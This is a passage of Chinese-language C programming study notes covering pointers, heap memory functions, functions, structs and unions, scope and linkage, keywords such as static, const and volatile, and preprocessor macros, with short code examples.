<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> b=<span class="number">77</span>;</span><br><span class="line"><span class="type">int</span> *q;  <span class="comment">// 定义了指针q</span></span><br><span class="line">q=&amp;b;    <span class="comment">// 指针q中存放变量b在内存的地址</span></span><br></pre></td></tr></table></figure>

<h3 id="通用指针"><a href="#通用指针" class="headerlink" title="通用指针"></a>通用指针</h3><p><code>void *</code>类型的指针，可以兼容任何其它类型的指针转换</p>
<h3 id="野指针"><a href="#野指针" class="headerlink" title="野指针"></a>野指针</h3><blockquote>
<p>定义了指针，但是指针没有明确的指向,这种指针就叫做野指针，解引用时会导致段错误</p>
</blockquote>
<h3 id="空指针"><a href="#空指针" class="headerlink" title="空指针"></a>空指针</h3><blockquote>
<p>在C语言中 NULL 和 0 指的都是空指针，C++11后专门加入了nullptr来表示空指针</p>
</blockquote>
<p>NULL表示的内存中的0x0000 0000</p>
<h2 id="指针的读写"><a href="#指针的读写" class="headerlink" title="指针的读写"></a>指针的读写</h2><p><strong>解引用和取地址互为逆运算</strong></p>
<ul>
<li>解引用：获取地址中保存的内容</li>
</ul>
<p><code>***指针**</code></p>
<blockquote>
<p>用于指针访问或者修改变量的值</p>
</blockquote>
<ul>
<li>取地址：获取变量在内存中的地址</li>
</ul>
<h3 id="地址分配"><a href="#地址分配" class="headerlink" title="地址分配"></a>地址分配</h3><p>地址的分配和释放都需要导入<code>#include &lt;stdlib.h&gt;</code></p>
<p><code>void *malloc(size_t size);</code></p>
<blockquote>
<p>分配堆内存空间</p>
</blockquote>
<ul>
<li>参数：size：要分配的堆空间的大小(单位：字节)</li>
</ul>
<p>返回值：</p>
<ul>
<li>分配给你的堆空间的首地址</li>
</ul>
<p><code>void *calloc(size_t nmemb, size_t size);</code> </p>
<blockquote>
<p>申请分配nmemb块内存，每个的大小是size</p>
</blockquote>
<ul>
<li>参数：nmemb：申请的内存区域块数  size：申请的内存区域每一块的大小</li>
</ul>
<p>返回值：</p>
<ul>
<li>分配给你的堆空间的首地址</li>
</ul>
<p><code>void *realloc(void *ptr, size_t size);</code> </p>
<blockquote>
<p>重新分配堆内存</p>
</blockquote>
<ul>
<li>参数：ptr：要重新分配空间的堆空间的首地址 size：新的堆空间的大小</li>
</ul>
<p>返回值：</p>
<ul>
<li>分配给你的新的堆空间的首地址</li>
</ul>
<h3 id="地址释放"><a href="#地址释放" class="headerlink" title="地址释放"></a>地址释放</h3><p><code>void free(void *ptr);</code>  </p>
<blockquote>
<p>释放堆空间，<strong>申请的堆空间必须主动释放，操作系统不会帮你释放</strong></p>
</blockquote>
<ul>
<li>参数：ptr：之前申请过的堆空间首地址</li>
</ul>
<h3 id="内存泄漏"><a href="#内存泄漏" class="headerlink" title="内存泄漏"></a>内存泄漏</h3><p>一直申请堆内存，但是都没有释放，导致堆内存越来越少，最后没有可以使用的堆内存</p>
<h3 id="堆内碎块"><a href="#堆内碎块" class="headerlink" title="堆内碎块"></a>堆内碎块</h3><p>频繁地分配和释放不同大小的堆空间会导致堆内碎块</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *p = <span class="string">&quot;hello&quot;</span>; <span class="comment">// 指针指向字符串常量 常量无法修改</span></span><br><span class="line">*p = <span class="string">&#x27;k&#x27;</span>; <span class="comment">// 断错误</span></span><br><span class="line"><span class="type">char</span> str[<span class="number">10</span>] = [<span class="string">&quot;hello&quot;</span>];</span><br><span class="line"><span class="type">char</span> *p;</span><br><span class="line">p = str;  <span class="comment">// 指针指向变量 ，可以修改</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>( 一 ) char p=”String” 此”String” 为常量 ( 二 ) strcpy(*str,”String”)，此字符串是常量</p>
</blockquote>
<h2 id="指针的运算"><a href="#指针的运算" class="headerlink" title="指针的运算"></a>指针的运算</h2><p><code>+</code> 算术加</p>
<blockquote>
<p>用指针去加一个整数,指针做加法，加的是类型的大小</p>
</blockquote>
<p>一个指针加上另外一个指针没有任何实际意义</p>
<p><code>-</code>  算术减</p>
<blockquote>
<p>用指针去减一个整数,指针做减法，减的是类型的大小<br>结果：(指针1地址值-指针2地址值)/类型大小</p>
</blockquote>
<p>一个指针减去另外一个指针有实际意义(在数组中是有意义的)<br>一个指针减另外一个指针，结果不是地址值直接相减，而是两个指针之间相差的对应类型之间的位数<br><code>++</code> 自增</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">*p++   <span class="comment">//先解引用p，然后p加1</span></span><br><span class="line">(*p)++ <span class="comment">//先解引用p，然后把解引用的值加1</span></span><br><span class="line">*++p   <span class="comment">//先将++用于p，然后解引用</span></span><br><span class="line">++*p   <span class="comment">//先解引用，然后把结果加1</span></span><br></pre></td></tr></table></figure>

<p><code>**=</code> 关系判断</p>
<blockquote>
<p>比较两个指针是否相等</p>
</blockquote>
<h2 id="指针数组"><a href="#指针数组" class="headerlink" title="指针数组"></a>指针数组</h2><p>数组中存放的全部都是指针，这种数组就叫做指针数组</p>
<p><strong><code>指针类型 数组名[数组元素个数];</code></strong></p>
<h3 id="指针数组的定义"><a href="#指针数组的定义" class="headerlink" title="指针数组的定义"></a>指针数组的定义</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> *a[<span class="number">3</span>];  <span class="comment">//3个int *</span></span><br><span class="line"><span class="type">char</span> *b[<span class="number">4</span>]; <span class="comment">//4个char *</span></span><br></pre></td></tr></table></figure>

<h2 id="二级指针"><a href="#二级指针" class="headerlink" title="二级指针"></a>二级指针</h2><p>二级指针也是指针，该指针用来存放一个一级指针在内存中的地址</p>
<p>二级指针解引用将变成对应的一级指针</p>
<h3 id="二级指针的运算"><a href="#二级指针的运算" class="headerlink" title="二级指针的运算"></a>二级指针的运算</h3><p>二级指针做加减法，加减的是指针(一级指针)的大小(64位系统加减8的倍数   32系统加减4的倍数)</p>
<h2 id="函数指针"><a href="#函数指针" class="headerlink" title="函数指针"></a>函数指针</h2><p>指向函数的入口地址的指针</p>
<blockquote>
<p>函数名就是个指针，函数名表示函数的入口地址</p>
</blockquote>
<h3 id="函数指针定义"><a href="#函数指针定义" class="headerlink" title="函数指针定义"></a>函数指针定义</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>;</span><br><span class="line"><span class="comment">//定义一个函数指针指向add</span></span><br><span class="line"><span class="type">int</span> (*p)(<span class="type">int</span>,<span class="type">int</span>)=add;</span><br><span class="line"><span class="type">int</span> *(*<span class="built_in">array</span>[<span class="number">10</span>])(<span class="type">int</span>) <span class="comment">// 定义一个数组,这个数组可以存放10个p类型的指针</span></span><br><span class="line"><span class="comment">//int *(*函数指针名字)(int)  -&gt; int *(*数组名[10])(int)</span></span><br></pre></td></tr></table></figure>

<h3 id="函数指针调用"><a href="#函数指针调用" class="headerlink" title="函数指针调用"></a>函数指针调用</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> (*p)(<span class="type">int</span>,<span class="type">int</span>)=&amp;add;</span><br><span class="line">(*p)(<span class="number">15</span>,<span class="number">16</span>);</span><br><span class="line">p(<span class="number">15</span>,<span class="number">16</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>函数指针的写法很特殊，add和&amp;add没有区别</p>
</blockquote>
<hr>
<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><p>将代码模块化，用来提升代码的复用率</p>
<p>函数封装原则上要”高内聚，低耦合”，高内聚就是把功能相关的模块集合在一起，低耦合就是每个模块之间的关联性降到可控范围的最低。</p>
<h2 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">返回值类型  函数名字(形参列表) <span class="comment">// 函数头</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="comment">//函数体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>函数头</li>
</ul>
<blockquote>
<p>函数的属性描述，如<code>int add(int a,int b)</code>就是一个函数头</p>
</blockquote>
<ul>
<li>函数体：{}中包裹的代码块</li>
<li>返回值类型：调用函数后将会返回的结果</li>
<li>函数的声明(函数原型声明)</li>
</ul>
<blockquote>
<p>函数声明可以放在主函数的前面，也可以单独放去头文件中</p>
</blockquote>
<ul>
<li>函数的定义：函数头和函数体完整地放在一起就是函数的定义</li>
</ul>
<blockquote>
<p>函数可以定义在主函数前面，也可以先在主函数前声明后，定义在主函数后</p>
</blockquote>
<ul>
<li>形参：形式参数，函数声明中或者函数定义中圆括号里面的就是形参</li>
<li>实参：实际参数，函数调用时程序员传递的参数就是实参</li>
</ul>
<h2 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h2><p><code>**函数名字(实参);**</code></p>
<h2 id="函数调用的过程"><a href="#函数调用的过程" class="headerlink" title="函数调用的过程"></a>函数调用的过程</h2><p>当你调用一个函数的时候，操作系统会帮你把这个函数入栈(压栈)<br>当函数调用结束的时候，函数会被自动出栈(弹栈)</p>
<h3 id="入栈-压栈"><a href="#入栈-压栈" class="headerlink" title="入栈(压栈)"></a>入栈(压栈)</h3><p>把局部变量/函数的入口地址存放到栈空间的栈顶</p>
<h3 id="出栈-弹栈"><a href="#出栈-弹栈" class="headerlink" title="出栈(弹栈)"></a>出栈(弹栈)</h3><p>把局部变量/函数的入口地址从栈空间的栈顶自动释放掉</p>
<h3 id="函数的入口地址"><a href="#函数的入口地址" class="headerlink" title="函数的入口地址"></a>函数的入口地址</h3><p>函数名就是个指针，就代表该函数在计算机中的地址(入口地址)</p>
<h2 id="实参和形参"><a href="#实参和形参" class="headerlink" title="实参和形参"></a>实参和形参</h2><ul>
<li>无参传参</li>
</ul>
<blockquote>
<p>其实就是传入void类型的参数</p>
</blockquote>
<ul>
<li>传值传参</li>
</ul>
<blockquote>
<p>实参把自己的值拷贝一份给形参，只要函数的形参写成普通变量(非指针)，那就是传值</p>
</blockquote>
<ul>
<li>传址传参</li>
</ul>
<blockquote>
<p>实参把自己的地址赋值给形参，只要函数的形参写成指针，那就是传地址</p>
</blockquote>
<ul>
<li>实参和形参拥有各自独立的地址空间</li>
<li>实参和形参可以同名</li>
<li>任何数组作为函数的形参，sizeof()求大小都是当成指针来求大小</li>
</ul>
<h2 id="函数返回值"><a href="#函数返回值" class="headerlink" title="函数返回值"></a>函数返回值</h2><ul>
<li>没有返回值 void</li>
</ul>
<p>要退出函数时直接写return</p>
<ul>
<li>返回普通变量类型</li>
</ul>
<p>要退出函数时return对应的值，编译器会把局部变量的值备份一份到寄存器中,返回的就是寄存器里面的备份值</p>
<blockquote>
<p>一般来说，如果函数的返回值类型是int，return 0表示函数正常退出，-1表示函数异常退出</p>
</blockquote>
<ul>
<li>返回指针</li>
</ul>
<blockquote>
<p>不可以返回局部变量的地址</p>
</blockquote>
<p>局部变量的作用域只是在定义它的函数中生效，当函数退出的时候，该局部变量的地址(栈空间)空间会被自动释放</p>
<h2 id="递归函数"><a href="#递归函数" class="headerlink" title="递归函数"></a>递归函数</h2><p>一个函数在执行的过程中，又再一次调用了该函数本身</p>
<p>一般栈空间只有数M，因此递归非常容易产生栈溢出，一定要保证初始化和退出条件的正确性。</p>
<h3 id="递归三要素"><a href="#递归三要素" class="headerlink" title="递归三要素"></a>递归三要素</h3><ol>
<li>确定递归形式参数</li>
<li>确定终止条件</li>
<li>确定求值逻辑</li>
</ol>
<h2 id="内联函数"><a href="#内联函数" class="headerlink" title="内联函数"></a>内联函数</h2><p>当函数代码量很小，并且需要反复使用的时候，就可以选择加上<code>inline</code>关键字定义成内联</p>
<p>当gcc无法识别内联函数的关键字时，可以尝试在编译时使用<code>-fgnu89-inline</code> 参数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">inline</span> 函数的返回值  函数名(形参)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 函数体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>解决函数调用时入栈和出栈的时间耗费，对于经常要使用的，短小的代码适合定义成内联函数</p>
</blockquote>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>编译器会在调用的位置直接把内联函数的源码展开</p>
<h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><p>节约了函数调用入栈出栈的时间耗费，内联函数用内联代码替换函数调用，内联函数体的代码不能过长，因为内联函数省去调用函数的时间是以代码膨胀为代价的，内联函数不能包含循环语句，因为执行循环语句要比调用函数的开销大</p>
<h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><p>增加主程序的长度，增加了主函数占用的内存，耗费了比较多的内存</p>
<h2 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h2><p>将函数作为参数交给适合触发该函数的函数，这个参数函数就称为回调函数。</p>
<h2 id="变参函数"><a href="#变参函数" class="headerlink" title="变参函数"></a>变参函数</h2><p>一个函数的形参类型，个数不确定，这种函数就是变参函数</p>
<p><code>...</code> 用来来省略参数的类型和个数</p>
<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>第一个参数必须是确定的</p>
<p>参数从右到左依次进栈，由前面确定的参数回溯出后面的变参(例如：printf的第一个参数格式输出符号回溯出后面的参数有几个，分别是什么类型)</p>
<blockquote>
<p>char和short会被自动提升为int，float会被提升为double</p>
</blockquote>
<h2 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h2><p><strong><code>int main(int argc,char **argv)</code></strong></p>
<p>主函数也是一个参数，在运行程序的时候，空格后跟着的字符串作为主函数的参数传入</p>
<ul>
<li>参数 argc 参数个数  argv 参数字符串组</li>
</ul>
<p>如果传入的是数字，这时候就需要将数字字符串转换成整型数字，<br><code>int atoi(const char *nptr);</code></p>
<p>将字符串转换成数字，需要导入<code>#include &lt;stdlib.h&gt;</code></p>
<ul>
<li>参数：nptr –》你要转换的字符串</li>
<li>返回值：转换后的整数</li>
</ul>
<h2 id="指针函数"><a href="#指针函数" class="headerlink" title="指针函数"></a>指针函数</h2><p>只要一个函数的返回值是指针，那么这个函数就叫做指针函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> *<span class="title function_">p</span><span class="params">(<span class="type">int</span>,<span class="type">int</span>)</span>;   <span class="comment">// 指针函数</span></span><br><span class="line"><span class="comment">//返回函数指针: 返回值类型  (*函数名字(形参))(形参)</span></span><br><span class="line"><span class="comment">//返回数组指针: 数组类型  (*函数名字(形参))[数组元素个数]</span></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="结构体-1"><a href="#结构体-1" class="headerlink" title="结构体"></a>结构体</h1><p>结构体是一种复合数据类型</p>
<h2 id="结构体定义"><a href="#结构体定义" class="headerlink" title="结构体定义"></a>结构体定义</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> (结构体名)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   <span class="comment">// 数据类型...</span></span><br><span class="line">&#125;(别名);</span><br></pre></td></tr></table></figure>

<ul>
<li>不加结构体名则为匿名结构体</li>
</ul>
<h2 id="结构体使用"><a href="#结构体使用" class="headerlink" title="结构体使用"></a>结构体使用</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在定义前加上typedef </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">student</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> name[<span class="number">10</span>]; <span class="comment">//姓名</span></span><br><span class="line">&#125;stu; </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">stu1</span>;</span></span><br><span class="line">stu stu2;  <span class="comment">//等价于struct student stu2;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//给匿名结构体类型取别名stu，结构体指针类型取别名stup</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>  </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> name[<span class="number">10</span>]; <span class="comment">//姓名</span></span><br><span class="line">&#125;stu,*stup;</span><br><span class="line">stu stu1;  <span class="comment">//定义了一个学生结构体变量叫做stu1</span></span><br><span class="line">stup p;   <span class="comment">//定义了一个学生结构体指针叫做p</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义结构体时，定义一个结构体变量stu并初始化stu里的元素值</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span>  </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> name[<span class="number">10</span>]; <span class="comment">//姓名</span></span><br><span class="line">  <span class="type">int</span> age; <span class="comment">//年龄</span></span><br><span class="line">  <span class="type">float</span> score; <span class="comment">//分数</span></span><br><span class="line">&#125;stu=&#123;<span class="string">&quot;zhangsan&quot;</span>,<span class="number">18</span>,<span class="number">65.5</span>&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>结构体中不能直接定义函数，但是可以声明函数指针，给函数指针赋值一个函数即可通过结构体调用结构体中定义的函数函数赋值的函数</li>
</ul>
<h2 id="结构体赋值与初始化"><a href="#结构体赋值与初始化" class="headerlink" title="结构体赋值与初始化"></a>结构体赋值与初始化</h2><ul>
<li>直接赋值</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">structstudent stu1=&#123;<span class="string">&quot;zhangsan&quot;</span>,<span class="number">18</span>,<span class="number">56.9</span>&#125;;     </span><br></pre></td></tr></table></figure>

<ul>
<li>延迟赋值</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">stu1</span>;</span></span><br><span class="line"><span class="built_in">strcpy</span>(stu1.name,<span class="string">&quot;张三&quot;</span>);  <span class="comment">//char数组不能直接赋值字符串 stu1.name=&quot;张三&quot;;是错误的</span></span><br><span class="line">stu1.age=<span class="number">19</span>;</span><br><span class="line">stu1.score=<span class="number">85.5</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>命名赋值</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">stu1</span>=</span>&#123;</span><br><span class="line">   .score=<span class="number">56</span>,</span><br><span class="line">   .age=<span class="number">15</span>,</span><br><span class="line">   .name=<span class="string">&quot;李四&quot;</span></span><br><span class="line">&#125;;      </span><br></pre></td></tr></table></figure>

<blockquote>
<p>还可以部分初始化，十分灵活</p>
</blockquote>
<ul>
<li>结构体赋值</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">stu2</span>;</span></span><br><span class="line">stu2=stu1;</span><br></pre></td></tr></table></figure>

<h2 id="结构体运算"><a href="#结构体运算" class="headerlink" title="结构体运算"></a>结构体运算</h2><p><code>.</code> 直接成员运算符</p>
<p>调用普通结构体里面的成员</p>
<p><code>-&gt;</code> 间接成员运算符</p>
<p>调用结构体指针里面的成员</p>
<p><code>sizeof()</code> 结构体大小</p>
<p>结构体的存储需要满足字节对齐，如果你的操作系统是64位系统：</p>
<blockquote>
<p>找到结构体中类型最大的成员，如果类型最大的成员&gt;=8字节，整个结构体依照8字节对齐，如果类型最大的成员&lt;8字节，整个结构体依照类型最大的成员对齐</p>
</blockquote>
<h3 id="位域"><a href="#位域" class="headerlink" title="位域"></a>位域</h3><p>有些信息在存储时，并不需要占用一个完整的字节， 而只需占几个或一个二进制位。例如在存放一个开关量时，只有0和1 两种状态， 用一位二进位即可。为了节省存储空间，并使处理简便，Ｃ语言又提供了一种数据结构，称为“位域”或“位段”。所谓“位域”是把一个字节中的二进位划分为几个不同的区域， 并说明每个区域的位数。每个域有一个域名，允许在程序中按域名进行操作。 这样就可以把几个不同的对象用一个字节的二进制位域来表示。</p>
<h1 id="共用体-1"><a href="#共用体-1" class="headerlink" title="共用体"></a>共用体</h1><p>联合体中所有的成员共用同一块内存区域，联合体的大小由最大的成员大小来决定，也要满足字节对齐</p>
<h2 id="共用体的定义"><a href="#共用体的定义" class="headerlink" title="共用体的定义"></a>共用体的定义</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> 共用体名</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">//成员;</span></span><br><span class="line">&#125;(别名);</span><br></pre></td></tr></table></figure>

<h1 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h1><p>表示变量的作用范围</p>
<ul>
<li>如果全局变量跟局部变量同名，此时局部变量会隐藏全局变量，导致全局变量不可见</li>
</ul>
<h2 id="全局作用域-文件作用域"><a href="#全局作用域-文件作用域" class="headerlink" title="全局作用域(文件作用域)"></a>全局作用域(文件作用域)</h2><p>在所有函数的外面定义的变量就是全局变量</p>
<ul>
<li>全局变量可以被所有的函数共享</li>
<li>实际开发中，全局变量往往用来在不同的函数之间传递信息的(共享信息)</li>
<li>全局变量没有初始化，默认都是0</li>
</ul>
<h2 id="局部作用域-代码块作用域"><a href="#局部作用域-代码块作用域" class="headerlink" title="局部作用域(代码块作用域)"></a>局部作用域(代码块作用域)</h2><p>在函数里面定义(包括形参)的变量，或者在for循环里面定义的就是局部变量</p>
<ul>
<li>局部变量只可以在定义它的那个函数范围内使用</li>
<li>局部变量没有初始化，默认是垃圾数</li>
</ul>
<h1 id="链接性"><a href="#链接性" class="headerlink" title="链接性"></a>链接性</h1><p>变量能否在不同的文件中共享</p>
<h2 id="外部链接性"><a href="#外部链接性" class="headerlink" title="外部链接性"></a>外部链接性</h2><p>全局变量具备外部链接性</p>
<ul>
<li>全局变量可以在定义它的.c文件中使用，也可以在其它的.c文件中使用</li>
</ul>
<h2 id="内部链接性"><a href="#内部链接性" class="headerlink" title="内部链接性"></a>内部链接性</h2><p>用static修饰的静态全局变量具备内部链接性(extern staic const define typedef)</p>
<ul>
<li>变量只能在定义它的.c文件中使用，其它文件中不能使用</li>
</ul>
<h2 id="无链接性"><a href="#无链接性" class="headerlink" title="无链接性"></a>无链接性</h2><p>局部变量是无链接性,局部变量只能在定义的函数里面使用</p>
<h1 id="存储持续性"><a href="#存储持续性" class="headerlink" title="存储持续性"></a>存储持续性</h1><p>描述变量的生命周期</p>
<ul>
<li>自动存储</li>
</ul>
<p>变量从定义的位置开始，到函数结束自动释放（局部变量就是自动存储）</p>
<ul>
<li>静态存储</li>
</ul>
<p>只要是static修饰的变量都是静态存储，全局变量也是静态存储，变量从定义的位置开始，到整个程序结束才释放</p>
<ul>
<li>动态存储</li>
</ul>
<p>使用堆空间,只要使用malloc calloc  realloc分配的地址空间，全部都是动态存储, 使用的时候要申请分配，使用完毕需要主动free释放</p>
<h1 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h1><h2 id="static"><a href="#static" class="headerlink" title="static"></a>static</h2><ul>
<li>static修饰全局变量</li>
</ul>
<p>改变全局变量的链接性，全局变量的链接性会从外部链接变成内部链接，此时这个全局变量只能在定义它的.c文件中使用，其它.c文件不可以使用</p>
<ul>
<li>static修饰局部变量</li>
</ul>
<p>表示该局部变量只能被初始化一次，static修饰的局部变量存放在数据段中<br>普通的局部变量存放在栈空间</p>
<ul>
<li>static修饰函数</li>
</ul>
<p>普通函数具备外部链接性，static修饰的函数具备内部链接性,只能在定义它的.c文件中使用</p>
<h2 id="const"><a href="#const" class="headerlink" title="const"></a>const</h2><ul>
<li>修饰普通变量</li>
</ul>
<p>标记为常量，常量是只读的(可以访问,不能修改)</p>
<ul>
<li>修饰指针</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a=<span class="number">99</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> *p=&amp;a;  <span class="comment">//表示指针p不可以修改a的内容</span></span><br><span class="line"><span class="type">int</span> <span class="type">const</span> *p=&amp;a;  <span class="comment">//第一种和第二种是等价的</span></span><br><span class="line"><span class="type">int</span> *<span class="type">const</span> p=&amp;a;  <span class="comment">//p指向a以后，后面就不可以再去指向其他变量的地址</span></span><br><span class="line"><span class="type">int</span> <span class="type">const</span> * <span class="type">const</span> p=&amp;a; <span class="comment">//p既不能修改指向的变量，也不能指向其他变量的地址</span></span><br></pre></td></tr></table></figure>

<h2 id="extern"><a href="#extern" class="headerlink" title="extern"></a>extern</h2><ul>
<li>声明外部全局变量</li>
</ul>
<p>如果当前文件需要使用在别的.c文件中定义的全局变量(非静态)，用extern声明即可</p>
<ul>
<li>声明外部函数</li>
</ul>
<p>如果当前文件需要使用在别的.c文件中定义的函数(非静态)，用extern声明即可</p>
<h2 id="typedef"><a href="#typedef" class="headerlink" title="typedef"></a>typedef</h2><p>给变量类型取别名</p>
<p><strong><code>typedef 基本数据类型  新的别名;</code></strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">int</span> u32;  <span class="comment">// 给基本数据类型取别名</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">char</span> * charp; <span class="comment">// 给指针取别名(用的比较多)</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span><span class="params">(*funp)</span><span class="params">(<span class="type">int</span>)</span>;  <span class="comment">//给int(*)(int)函数指针，取了别名，叫做funp</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> a[<span class="number">10</span>]; <span class="comment">//给int[10]这种类型的数组，取了别名，叫做a</span></span><br><span class="line"><span class="comment">// 给结构体取别名</span></span><br></pre></td></tr></table></figure>

<h3 id="定义可移植数据类型"><a href="#定义可移植数据类型" class="headerlink" title="定义可移植数据类型"></a>定义可移植数据类型</h3><p>同样的代码，编译运行的时候，不同的系统可能会出现数据越界问题</p>
<p>解决方法：用别名来定义数据，需要的时候直接修改别名对应的数据类型即可</p>
<h2 id="volatile"><a href="#volatile" class="headerlink" title="volatile"></a>volatile</h2><p>修饰易变的变量，告诉编译器这个变量的值短时间内会改变很多次，不要去优化该变量</p>
<p>一个定义为volatile的变量说明此变量可能会被意想不到地改变，这样，编译器就不会去假设这个变量的值了。精确地说就是，优化器在用到这个变量时必须每次都小心地重新读取这个变量的值，而不是使用保存在寄存器里的备份</p>
<h3 id="编译器优化的含义"><a href="#编译器优化的含义" class="headerlink" title="编译器优化的含义"></a>编译器优化的含义</h3><p>例如编译器会聪明地认为如果一个变量i赋值给了a，然后执行几行代码之后再赋值给b，那么编译器会认为a和b是相等的（过程中没有代码改变i的值），其实这是不完全对的，有些情况下虽然代码不能改变i的值，但是其他行为可以改变（例如i是一个寄存器变量或者端口数据）</p>
<h1 id="预处理编译"><a href="#预处理编译" class="headerlink" title="预处理编译"></a>预处理编译</h1><h2 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h2><p>用来包含其他头文件,函数的声明，全局变量，结构体，共用体，枚举的定义，内联函数等</p>
<p><code>#include &lt;头文件&gt;</code></p>
<h2 id="自定义头文件"><a href="#自定义头文件" class="headerlink" title="自定义头文件"></a>自定义头文件</h2><p><code>“”</code> 用于自定义的头文件，编译器默认会先从当前路径下寻找这个头文件，如果找不到，就去系统的环境变量中查找头文件，两个地方都找不到就报错(没有这个头文件)</p>
<p><code>&lt;&gt;</code> 通常用于系统提供的头文件，编译器默认去系统的环境变量中查找头文件</p>
<h2 id="解决头文件重复包含的问题"><a href="#解决头文件重复包含的问题" class="headerlink" title="解决头文件重复包含的问题"></a>解决头文件重复包含的问题</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span>  _头文件的名字_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  _头文件的名字_H</span></span><br><span class="line">	<span class="comment">//头文件里面的具体内容</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<h2 id="宏定义define"><a href="#宏定义define" class="headerlink" title="宏定义define"></a>宏定义define</h2><p>用作字符的替换，一般写成大写</p>
<ul>
<li>普通宏定义 不带参数</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span>  PATH  <span class="string">&quot;/dev/fb0&quot;</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li>宏函数 带参</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> max(a,b) a&gt;b?a:b;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>宏函数不是真正意义上的函数,宏函数没有入栈出栈的操作,普通函数需要入栈，出栈</p>
</blockquote>
<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ol>
<li>每个单独的宏定义，都各自占一行</li>
<li>宏定义一行写不下，必须加上续行符</li>
<li>宏定义中的参数都是没有数据类型的</li>
<li>带参数的宏定义，参数用圆括号括起来</li>
</ol>
<h2 id="条件编译"><a href="#条件编译" class="headerlink" title="条件编译"></a>条件编译</h2><p>满足条件，编译器就会编译对应的代码，不满足，代码会被编译器忽略(相当于注释掉了代码)</p>
<ul>
<li>条件满足编译</li>
</ul>
